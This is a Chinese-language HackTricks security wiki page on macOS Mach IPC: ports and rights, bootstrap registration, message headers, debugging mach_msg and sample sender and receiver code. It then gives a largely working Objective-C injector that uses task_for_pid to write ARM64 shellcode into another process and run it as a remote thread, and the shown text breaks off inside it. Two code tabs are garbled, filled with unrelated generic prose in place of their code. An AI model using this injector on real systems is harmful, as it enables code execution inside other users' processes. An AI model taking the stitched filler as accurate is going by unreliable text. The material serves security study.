# macOS IPC - 进程间通信

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 通过端口进行Mach消息传递

### 基本信息

Mach使用**任务**作为共享资源的**最小单位**，每个任务可以包含**多个线程**。这些**任务和线程与POSIX进程和线程一一映射**。

任务之间的通信通过Mach进程间通信（IPC）进行，利用单向通信通道。**消息在端口之间传递**，这些端口类似于由内核管理的**消息队列**。

**端口**是Mach IPC的**基本**元素。它可用于**发送消息和接收**消息。

每个进程都有一个**IPC表**，在其中可以找到**进程的mach端口**。mach端口的名称实际上是一个数字（指向内核对象的指针）。

进程还可以将带有某些权限的端口名称**发送给另一个任务**，内核将在**其他任务的IPC表**中创建此条目。

### 端口权限

端口权限定义了任务可以执行的操作，对于这种通信至关重要。可能的**端口权限**包括（[此处的定义](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

* **接收权限**，允许接收发送到端口的消息。Mach端口是MPSC（多生产者，单消费者）队列，这意味着整个系统中可能只有**一个接收权限**与每个端口相关联（与管道不同，在管道的读端可以有多个进程持有文件描述符）。
* 具有**接收权限**的任务可以接收消息并**创建发送权限**，从而允许其发送消息。最初，只有**自己的任务**对其端口具有接收权限。
* 如果拥有接收权限的所有者**死亡**或终止它，**发送权限将变得无效（死命名）。**
* **发送权限**，允许向端口发送消息。
* 发送权限可以**克隆**，因此拥有发送权限的任务可以克隆权限并将其授予第三个任务。
* 注意**端口权限**也可以通过Mac消息**传递**。
* **一次性发送权限**，允许向端口发送一条消息，然后消失。
* 此权限**无法**被**克隆**，但可以**移动**。
* **端口集权限**，表示一个_端口集_而不是单个端口。从端口集中出列消息会从其中一个包含的端口中出列消息。端口集可用于同时监听多个端口，类似于Unix中的`select`/`poll`/`epoll`/`kqueue`。
* **死命名**，它不是实际的端口权限，而仅仅是一个占位符。当一个端口被销毁时，所有现有的端口权限都变成死命名。

**任务可以将发送权限传递给其他任务**，使其能够发送消息回来。**发送权限也可以被克隆**，因此一个任务可以复制并将权限授予第三个任务。结合一个名为**引导服务器**的中间进程，可以实现任务之间的有效通信。

### 文件端口

文件端口允许在Mac端口中封装文件描述符（使用Mach端口权限）。可以使用`fileport_makeport`从给定的FD创建`fileport`，并使用`fileport_makefd`从`fileport`创建FD。

### 建立通信

如前所述，可以使用Mach消息发送权限，但是，您**不能在没有发送Mach消息的权限的情况下发送权限**。那么，如何建立第一次通信呢？

为此，涉及**引导服务器**（mac中的**launchd**），因为**每个人都可以获得发送权限到引导服务器**，因此可以要求它为发送消息到另一个进程的权限：

1. 任务**A**创建一个**新端口**，获得其**接收权限**。
2. 作为接收权限的持有者，任务**A**为端口**生成一个发送权限**。
3. 任务**A**与**引导服务器**建立**连接**，并**将其在开始时生成的端口的发送权限发送给它**。
* 请记住，任何人都可以获得发送权限到引导服务器。
4. 任务A向引导服务器发送`bootstrap_register`消息，以将给定端口与名称（如`com.apple.taska`）**关联**。
5. 任务**B**与**引导服务器**交互以执行服务名称的引导**查找**（`bootstrap_lookup`）。因此，引导服务器可以响应，任务B将在查找消息中向其发送**先前创建的端口的发送权限**。如果查找成功，**服务器会复制从任务A接收的发送权限**，并**传输给任务B**。
* 请记住，任何人都可以获得发送权限到引导服务器。
6. 有了这个发送权限，**任务B**能够向**任务A**发送**消息**。
7. 对于双向通信，通常任务**B**生成一个具有**接收**权限和**发送**权限的新端口，并将**发送权限提供给任务A**，以便其可以向任务B发送消息（双向通信）。

引导服务器**无法验证**任务声明的服务名称。这意味着一个**任务**可能潜在地**冒充任何系统任务**，例如虚假**声明授权服务名称**，然后批准每个请求。

然后，Apple将**系统提供的服务名称**存储在安全配置文件中，位于**SIP受保护**的目录中：`/System/Library/LaunchDaemons`和`/System/Library/LaunchAgents`。引导服务器将为这些服务名称中的每一个创建并持有一个**接收权限**。

对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：

* 任务**B**启动服务名称的引导**查找**。
* **launchd**检查任务是否正在运行，如果没有，则**启动**它。
* 任务**A**（服务）执行**引导签入**（`bootstrap_check_in()`）。在这里，**引导**服务器创建一个发送权限，保留它，并**将接收权限传递给任务A**。
* launchd复制**发送权限并将其发送给任务B**。
* 任务**B**生成一个具有**接收**权限和**发送**权限的新端口，并将**发送权限提供给任务A**（服务），以便其可以向任务B发送消息（双向通信）。

然而，此过程仅适用于预定义的系统任务。非系统任务仍按最初描述的方式运行，这可能导致潜在的冒充。

{% hint style="danger" %}
因此，launchd绝不能崩溃，否则整个系统将崩溃。
{% endhint %}
### 一个 Mach 消息

[在这里查找更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 函数，本质上是一个系统调用，用于发送和接收 Mach 消息。该函数要求将消息作为初始参数发送。这条消息必须以 `mach_msg_header_t` 结构开头，后跟实际的消息内容。该结构定义如下：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
具有 _**接收权限**_ 的进程可以在 Mach 端口上接收消息。相反，**发送方** 被授予 _**发送权限**_ 或 _**一次性发送权限**_。一次性发送权限专门用于发送一条消息，之后将变为无效。

初始字段 **`msgh_bits`** 是一个位图：

* 第一个位（最重要的）用于指示消息是否复杂（稍后会详细介绍）
* 第 3 和第 4 位由内核使用
* 第 2 字节的 **最不重要的 5 位** 可用于 **凭证**：另一种发送键/值组合的端口。
* 第 3 字节的 **最不重要的 5 位** 可用于 **本地端口**
* 第 4 字节的 **最不重要的 5 位** 可用于 **远程端口**

凭证、本地端口和远程端口中可以指定的类型为（来自 [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
例如，`MACH_MSG_TYPE_MAKE_SEND_ONCE` 可用于**指示**应为此端口派生并传输**一次性发送权**。也可以指定 `MACH_PORT_NULL` 以防止接收方能够回复。

为了实现简单的**双向通信**，进程可以在名为 _reply port_（**`msgh_local_port`**）的 mach **消息头**中指定一个**mach端口**，接收消息的人可以向此消息**发送回复**。

{% hint style="success" %}
请注意，这种双向通信在期望回复的 XPC 消息中使用（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但通常会像之前解释的那样创建不同的端口来创建双向通信。
{% endhint %}

消息头的其他字段包括：

- `msgh_size`：整个数据包的大小。
- `msgh_remote_port`：发送此消息的端口。
- `msgh_voucher_port`：[mach凭证](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
- `msgh_id`：此消息的ID，由接收方解释。

{% hint style="danger" %}
请注意，**mach消息通过 `mach端口` 发送**，这是内置于 mach 内核中的**单接收方**、**多发送方**通信通道。**多个进程**可以向 mach 端口**发送消息**，但在任何时候只有**一个进程可以读取**它。
{% endhint %}

然后，消息由**`mach_msg_header_t`**头部、**主体**和**尾部**（如果有）组成，并且可以授予回复权限。在这些情况下，内核只需将消息从一个任务传递到另一个任务。

**尾部**是**内核添加到消息中的信息**（用户无法设置），可以在消息接收时使用标志 `MACH_RCV_TRAILER_<trailer_opt>`（可以请求不同的信息）。

#### 复杂消息

然而，还有其他更**复杂**的消息，比如传递附加端口权限或共享内存的消息，内核还需要将这些对象发送给接收方。在这种情况下，头部 `msgh_bits` 的最高位被设置。

可以在[**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)中定义要传递的可能描述符：
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac 端口 API

请注意，端口与任务命名空间相关联，因此要创建或搜索端口，还需要查询任务命名空间（更多信息请参见 `mach/mach_port.h`）：

- **`mach_port_allocate` | `mach_port_construct`**：**创建**一个端口。
- `mach_port_allocate` 还可以创建一个**端口集**：接收一组端口的接收权。每当接收到消息时，都会指示消息来自哪个端口。
- `mach_port_allocate_name`：更改端口的名称（默认为32位整数）。
- `mach_port_names`：从目标获取端口名称。
- `mach_port_type`：获取任务对名称的权限。
- `mach_port_rename`：重命名端口（类似于 FD 的 dup2）。
- `mach_port_allocate`：分配新的接收、端口集或 DEAD_NAME。
- `mach_port_insert_right`：在具有接收权限的端口中创建新的权限。
- `mach_port_...`
- **`mach_msg` | `mach_msg_overwrite`**：用于**发送和接收 mach 消息**的函数。覆盖版本允许指定不同的缓冲区用于消息接收（另一个版本将仅重用它）。

### 调试 mach_msg

由于函数**`mach_msg`**和**`mach_msg_overwrite`**是用于发送和接收消息的函数，设置在它们上的断点将允许检查发送和接收的消息。

例如，开始调试任何可以调试的应用程序，因为它将加载**`libSystem.B`，该库将使用此函数**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>断点 1: 位置 = libsystem_kernel.dylib`mach_msg，地址 = 0x00000001803f6c20
<strong>(lldb) r
</strong>进程 71019 已启动：'/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
进程 71019 已停止
* 线程 #1，队列 = 'com.apple.main-thread'，停止原因 = 断点 1.1
帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg：
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
目标 0：(SandboxedShellApp) 已停止。
<strong>(lldb) bt
</strong>* 线程 #1，队列 = 'com.apple.main-thread'，停止原因 = 断点 1.1
* 帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
帧 #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
帧 #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
帧 #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
帧 #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
帧 #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
帧 #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
帧 #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
帧 #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
帧 #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

要获取**`mach_msg`**的参数，请检查寄存器。这些是参数（来自 [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
从注册表中获取值：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
检查消息头，检查第一个参数：
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
那种`mach_msg_bits_t`类型非常常见，用于允许回复。



### 枚举端口
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**名称** 是给端口的默认名称（检查前3个字节如何**递增**）。**`ipc-object`** 是端口的**混淆**唯一**标识符**。\
还要注意只有**`send`** 权限的端口如何**标识其所有者**（端口名称 + pid）。\
还要注意使用 **`+`** 表示**连接到同一端口的其他任务**。

也可以使用 [**procesxp**](https://www.newosxbook.com/tools/procexp.html) 来查看还有**注册的服务名称**（由于需要 `com.apple.system-task-port`，因此需要禁用 SIP）:
```
procesp 1 ports
```
您可以从[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)下载iOS上的工具进行安装。

### 代码示例

请注意**发送方**如何**分配**一个端口，为名称`org.darlinghq.example`创建一个**发送权限**，并将其发送到**引导服务器**，同时发送方请求该名称的**发送权限**并使用它来**发送消息**。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
## macOS Inter-Process Communication (IPC)

### Introduction

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate and share data with each other. On macOS, IPC can be achieved using various methods such as Mach ports, XPC services, and UNIX domain sockets.

### Vulnerabilities

1. **Insecure Communication**: Lack of encryption and authentication in IPC mechanisms can lead to data interception and tampering by malicious actors.
2. **Improper Input Validation**: Failing to validate input data in IPC messages can result in buffer overflows and other security vulnerabilities.
3. **Privilege Escalation**: Insecure IPC implementations can be exploited to escalate privileges and gain unauthorized access to system resources.

### Mitigations

1. **Use Secure Communication Channels**: Implement encryption and authentication mechanisms to secure IPC communications.
2. **Validate Input Data**: Always validate input data to prevent buffer overflows and other types of attacks.
3. **Least Privilege Principle**: Ensure that IPC mechanisms have the least amount of privileges necessary to function properly.

By understanding the vulnerabilities and applying proper mitigations, developers can enhance the security of IPC implementations on macOS.  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### 特权端口

- **主机端口**：如果一个进程对这个端口有**发送**权限，他可以获取关于**系统**的**信息**（例如`host_processor_info`）。
- **主机特权端口**：拥有对这个端口的**发送**权限的进程可以执行像加载内核扩展这样的**特权操作**。**进程需要是root用户**才能获得这个权限。
- 此外，为了调用**`kext_request`** API，需要具有其他授权**`com.apple.private.kext*`**，这些授权仅分配给苹果二进制文件。
- **任务名称端口**：_任务端口_的非特权版本。它引用任务，但不允许控制它。似乎唯一可以通过它获得的是`task_info()`。
- **任务端口**（又名内核端口）**：**拥有对此端口的发送权限，可以控制任务（读/写内存，创建线程等）。
- 调用`mach_task_self()`来为调用者任务获取此端口的**名称**。此端口仅在**`exec()`**跨进程继承；使用`fork()`创建的新任务会获得一个新的任务端口（作为一个特例，在suid二进制文件中的`exec()`后，任务也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)同时执行`fork()`。
- 访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）如下：
  - 如果应用程序具有**`com.apple.security.get-task-allow`授权**，来自**相同用户**的进程可以访问任务端口（通常由Xcode添加用于调试）。**经过公证**的过程不会允许将其用于生产发布。
  - 具有**`com.apple.system-task-ports`授权**的应用程序可以获取任何进程的**任务端口**，除了内核。在旧版本中，它被称为**`task_for_pid-allow`**。这仅授予给苹果应用程序。
  - **Root用户可以访问**未使用**强化**运行时编译的应用程序的任务端口（且不是来自苹果）。

### 通过任务端口在线程中注入Shellcode

您可以从以下位置获取一个Shellcode：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## macOS进程滥用

### macOS IPC（进程间通信）

在macOS中，进程间通信（IPC）是不同进程之间进行数据交换和通信的一种机制。攻击者可以利用IPC来实现特权升级和绕过安全措施。要防止这种滥用，可以通过审查和限制应用程序的IPC使用来加强macOS系统的安全性。

#### 示例

- **XPC服务滥用**：攻击者可以通过篡改XPC服务的通信来实现特权升级。
  
- **Mach端口滥用**：攻击者可以利用Mach端口进行进程间通信，从而绕过macOS的安全机制。

#### 防御措施

- **限制IPC权限**：审查和限制应用程序的IPC权限，只允许必要的通信。
  
- **加密通信**：对IPC通信进行加密，防止中间人攻击和数据泄露。

通过加强对macOS系统中IPC的监控和限制，可以有效防止进程滥用和提升系统安全性。

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
**编译**前面的程序并添加**权限**以能够使用相同用户注入代码（如果不是，则需要使用**sudo**）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
